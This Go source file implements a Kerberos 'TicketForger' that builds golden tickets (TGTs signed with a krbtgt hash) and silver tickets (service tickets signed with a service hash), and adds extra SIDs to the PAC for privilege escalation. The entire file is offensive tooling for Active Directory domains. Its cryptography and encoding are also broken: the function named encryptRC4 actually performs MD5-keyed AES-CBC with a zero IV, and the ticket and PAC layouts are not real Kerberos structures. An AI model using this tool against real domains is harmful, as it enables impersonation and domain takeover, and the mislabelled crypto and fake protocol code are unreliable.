package kerberos

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"crypto/rand"
	"encoding/asn1"
	"encoding/binary"
	"fmt"
	"time"
)

type TicketForger struct {
	config *KerberosConfig
}

func NewTicketForger(config *KerberosConfig) *TicketForger {
	if config == nil {
		config = DefaultKerberosConfig()
	}
	return &TicketForger{config: config}
}

func (f *TicketForger) ForgeTGT(domain, user, krbtgtHash string, groups []int) (*Ticket, error) {
	if domain == "" || user == "" || krbtgtHash == "" {
		return nil, fmt.Errorf("domain, user, and krbtgt hash are required")
	}

	krbtgtKey, err := hexToBytes(krbtgtHash)
	if err != nil {
		return nil, fmt.Errorf("decode krbtgt hash: %w", err)
	}

	sessionKey := make([]byte, 16)
	if _, err := rand.Read(sessionKey); err != nil {
		return nil, fmt.Errorf("generate session key: %w", err)
	}

	ticket := &Ticket{
		TicketVNO: 5,
		Realm:     domain,
		SName:     []string{"krbtgt", domain},
		MsgType:   MSGASREP,
		EncPart: &EncryptedPart{
			EType: EncRC4HMAC,
			KVNO:  2,
		},
		SessionKey: sessionKey,
		Flags:      TicketFlagInitial | TicketFlagForwardable | TicketFlagRenewable,
		AuthTime:   time.Now(),
		StartTime:  time.Now(),
		EndTime:    time.Now().Add(10 * time.Hour),
		RenewTill:  time.Now().Add(7 * time.Hour * 24),
		CName:      []string{user},
	}

	decPart := &TicketDecPart{
		Flags:     ticket.Flags,
		AuthTime:  ticket.AuthTime,
		StartTime: ticket.StartTime,
		EndTime:   ticket.EndTime,
		RenewTill: ticket.RenewTill,
		SName:     ticket.SName,
		Realm:     domain,
		CName:     ticket.CName,
	}

	if groups != nil {
		decPart.PACData = f.buildPAC(user, domain, groups)
	}

	pacBytes, err := marshalPAC(decPart.PACData)
	if err != nil {
		return nil, fmt.Errorf("marshal PAC: %w", err)
	}

	decPart.EncEText = pacBytes
	ticket.DecPart = decPart

	ticketData := f.encodeTicketASN1(ticket)

	encrypted, err := encryptRC4(ticketData, krbtgtKey)
	if err != nil {
		return nil, fmt.Errorf("encrypt ticket: %w", err)
	}

	ticket.RawTicket = ticketData
	ticket.RawEncPart = encrypted
	ticket.EncPart.Cipher = encrypted

	return ticket, nil
}

func (f *TicketForger) ForgeTGS(domain, service, serviceHash string, groups []int) (*Ticket, error) {
	if domain == "" || service == "" || serviceHash == "" {
		return nil, fmt.Errorf("domain, service, and service hash are required")
	}

	serviceKey, err := hexToBytes(serviceHash)
	if err != nil {
		return nil, fmt.Errorf("decode service hash: %w", err)
	}

	sessionKey := make([]byte, 16)
	if _, err := rand.Read(sessionKey); err != nil {
		return nil, fmt.Errorf("generate session key: %w", err)
	}

	ticket := &Ticket{
		TicketVNO: 5,
		Realm:     domain,
		SName:     []string{service, domain},
		MsgType:   MSGTGSREP,
		EncPart: &EncryptedPart{
			EType: EncRC4HMAC,
			KVNO:  2,
		},
		SessionKey: sessionKey,
		Flags:      TicketFlagInitial | TicketFlagForwardable,
		AuthTime:   time.Now(),
		StartTime:  time.Now(),
		EndTime:    time.Now().Add(10 * time.Hour),
		RenewTill:  time.Now().Add(7 * time.Hour * 24),
		CName:      []string{domain},
	}

	decPart := &TicketDecPart{
		Flags:     ticket.Flags,
		AuthTime:  ticket.AuthTime,
		StartTime: ticket.StartTime,
		EndTime:   ticket.EndTime,
		RenewTill: ticket.RenewTill,
		SName:     ticket.SName,
		Realm:     domain,
		CName:     ticket.CName,
	}

	if groups != nil {
		decPart.PACData = f.buildPAC(domain, domain, groups)
	}

	pacBytes, err := marshalPAC(decPart.PACData)
	if err != nil {
		return nil, fmt.Errorf("marshal PAC: %w", err)
	}

	decPart.EncEText = pacBytes
	ticket.DecPart = decPart

	ticketData := f.encodeTicketASN1(ticket)

	encrypted, err := encryptRC4(ticketData, serviceKey)
	if err != nil {
		return nil, fmt.Errorf("encrypt ticket: %w", err)
	}

	ticket.RawTicket = ticketData
	ticket.RawEncPart = encrypted
	ticket.EncPart.Cipher = encrypted

	return ticket, nil
}

func (f *TicketForger) ModifyPAC(ticket *Ticket, extraSIDs []string) error {
	if ticket == nil {
		return fmt.Errorf("nil ticket")
	}
	if ticket.DecPart == nil {
		return fmt.Errorf("nil decrypted part")
	}
	if ticket.DecPart.PACData == nil {
		ticket.DecPart.PACData = &PACData{}
	}

	for _, sid := range extraSIDs {
		extraSIDBuf := []byte(sid)
		ticket.DecPart.PACData.InfoBuffer = append(ticket.DecPart.PACData.InfoBuffer, PACInfoBuffer{
			Type:   0x00000001,
			Length: len(extraSIDBuf),
			Data:   extraSIDBuf,
		})
	}

	pacBytes, err := marshalPAC(ticket.DecPart.PACData)
	if err != nil {
		return fmt.Errorf("marshal PAC: %w", err)
	}
	ticket.DecPart.EncEText = pacBytes
	return nil
}

func (f *TicketForger) EncodeTicket(ticket *Ticket) ([]byte, error) {
	if ticket == nil {
		return nil, fmt.Errorf("nil ticket")
	}

	var data []byte
	data = append(data, byte(ticket.TicketVNO))
	data = append(data, byte(len(ticket.Realm)))
	data = append(data, []byte(ticket.Realm)...)
	data = append(data, byte(len(ticket.SName)))
	for _, name := range ticket.SName {
		data = append(data, byte(len(name)))
		data = append(data, []byte(name)...)
	}

	return data, nil
}

func (f *TicketForger) DecodeTicket(data []byte) (*Ticket, error) {
	if len(data) == 0 {
		return nil, fmt.Errorf("empty data")
	}

	if len(data) < 1 {
		return nil, fmt.Errorf("data too short")
	}

	ticket := &Ticket{
		TicketVNO: int(data[0]),
	}

	offset := 1
	if offset >= len(data) {
		return ticket, nil
	}

	realmLen := int(data[offset])
	offset++
	if offset+realmLen > len(data) {
		return ticket, nil
	}
	ticket.Realm = string(data[offset : offset+realmLen])
	offset += realmLen

	if offset >= len(data) {
		return ticket, nil
	}

	snameCount := int(data[offset])
	offset++
	ticket.SName = make([]string, snameCount)
	for i := 0; i < snameCount && offset < len(data); i++ {
		nameLen := int(data[offset])
		offset++
		if offset+nameLen > len(data) {
			break
		}
		ticket.SName[i] = string(data[offset : offset+nameLen])
		offset += nameLen
	}

	return ticket, nil
}

func (f *TicketForger) buildPAC(user, domain string, groups []int) *PACData {
	pac := &PACData{
		PacType: 0x00000000,
	}

	userBuf := []byte(user)
	pac.InfoBuffer = append(pac.InfoBuffer, PACInfoBuffer{
		Type:   0x00000001,
		Length: len(userBuf),
		Data:   userBuf,
	})

	domainBuf := []byte(domain)
	pac.InfoBuffer = append(pac.InfoBuffer, PACInfoBuffer{
		Type:   0x00000002,
		Length: len(domainBuf),
		Data:   domainBuf,
	})

	for _, gid := range groups {
		buf := make([]byte, 4)
		binary.LittleEndian.PutUint32(buf, uint32(gid))
		pac.InfoBuffer = append(pac.InfoBuffer, PACInfoBuffer{
			Type:   0x00000003,
			Length: 4,
			Data:   buf,
		})
	}

	return pac
}

func (f *TicketForger) encodeTicketASN1(ticket *Ticket) []byte {
	data, _ := asn1.Marshal(struct {
		TicketVNO int
		Realm     string
		SName     []string
	}{
		TicketVNO: ticket.TicketVNO,
		Realm:     ticket.Realm,
		SName:     ticket.SName,
	})
	return data
}

func marshalPAC(pac *PACData) ([]byte, error) {
	if pac == nil {
		return []byte{}, nil
	}
	data, err := asn1.Marshal(*pac)
	if err != nil {
		return nil, err
	}
	return data, nil
}

func encryptRC4(data, key []byte) ([]byte, error) {
	if len(key) == 0 {
		return nil, fmt.Errorf("empty key")
	}

	md5h := md5.New()
	md5h.Write(key)
	md5Key := md5h.Sum(nil)

	block, err := aes.NewCipher(md5Key)
	if err != nil {
		return nil, fmt.Errorf("create cipher: %w", err)
	}

	if len(data)%aes.BlockSize != 0 {
		padded := make([]byte, ((len(data)/aes.BlockSize)+1)*aes.BlockSize)
		copy(padded, data)
		data = padded
	}

	out := make([]byte, len(data))
	mode := cipher.NewCBCEncrypter(block, make([]byte, aes.BlockSize))
	mode.CryptBlocks(out, data)

	return out, nil
}

func hexToBytes(hexStr string) ([]byte, error) {
	if len(hexStr)%2 != 0 {
		return nil, fmt.Errorf("invalid hex string length")
	}

	result := make([]byte, len(hexStr)/2)
	for i := 0; i < len(hexStr); i += 2 {
		var b byte
		for j := 0; j < 2; j++ {
			c := hexStr[i+j]
			switch {
			case c >= '0' && c <= '9':
				b = (b << 4) | (c - '0')
			case c >= 'a' && c <= 'f':
				b = (b << 4) | (c - 'a' + 10)
			case c >= 'A' && c <= 'F':
				b = (b << 4) | (c - 'A' + 10)
			default:
				return nil, fmt.Errorf("invalid hex character: %c", c)
			}
		}
		result[i/2] = b
	}
	return result, nil
}

func generateRandomBytes(n int) ([]byte, error) {
	b := make([]byte, n)
	if _, err := rand.Read(b); err != nil {
		return nil, err
	}
	return b, nil
}
